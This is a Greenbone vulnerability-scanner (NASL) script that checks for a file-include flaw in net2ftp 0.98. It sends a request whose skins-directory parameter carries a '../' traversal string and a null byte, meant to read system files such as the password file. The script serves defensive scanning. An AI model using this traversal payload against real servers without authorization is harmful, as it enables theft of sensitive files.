# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:net2ftp:net2ftp";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100943");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-12-10 13:28:59 +0100 (Fri, 10 Dec 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("net2ftp 'admin1.template.php' Local and Remote File Include Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45312");
  script_xref(name:"URL", value:"http://www.net2ftp.com/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("net2ftp_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("net2ftp/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"The 'net2ftp' program is prone to a local file-include vulnerability
and a remote file-include vulnerability because the application fails to sufficiently sanitize user-supplied input.

An attacker can exploit these issues to obtain sensitive information, other attacks are also possible.

net2ftp 0.98 stable is vulnerable, other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]=" +
        crap(data: "../", length: 3*9) + files[file] + "%00";

  if (http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
